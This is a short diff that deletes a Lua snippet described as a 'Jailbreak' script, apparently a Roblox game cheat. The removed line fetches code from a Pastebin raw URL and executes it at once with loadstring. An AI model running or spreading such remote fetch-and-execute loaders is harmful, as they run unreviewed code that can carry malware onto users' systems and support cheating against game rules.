@@ -1,3 +1,0 @@
--- Yet another Jailbreak script released not so long ago. IDK if it works or not...
--- https://t0.rbxcdn.com/ecf0303a4770c4aa0d0a6771015c0202
-loadstring(game:HttpGet("https://pastebin.com/raw/yvmWLNP0", true))()
